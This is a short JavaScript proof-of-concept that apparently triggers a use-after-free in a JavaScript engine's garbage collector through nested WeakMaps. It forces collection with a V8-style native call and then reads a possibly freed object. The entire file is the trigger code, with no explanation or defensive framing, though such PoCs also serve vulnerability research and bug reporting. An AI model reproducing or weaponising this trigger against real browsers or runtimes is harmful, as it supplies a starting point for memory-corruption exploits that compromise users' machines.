var wm = new WeakMap();
var k0 = { k: 0 };

function fml() {
  let uaf_map = new WeakMap();

  let k_uaf = {k: 1337};
  let v_uaf = {v: 1338};
  let k_kuafptr = k_uaf;
  
  let k2 = {k: 2};
  let v0 = {v: 0};

  wm.set(v0, uaf_map);
  wm.set(k2, k_kuafptr);
  wm.set(k0, v0);

  uaf_map.set(k_uaf, v_uaf);
  uaf_map.set(k0, k2);
}

fml();

% CollectGarbage(null);

let uaf_map = wm.get(wm.get(k0));
let k_uafptr = wm.get(uaf_map.get(k0));
let v_uaf = uaf_map.get(k_uafptr);

console.log("WoW " + v_uaf.v);
// RUN GC

console.log("[*] Done what!");
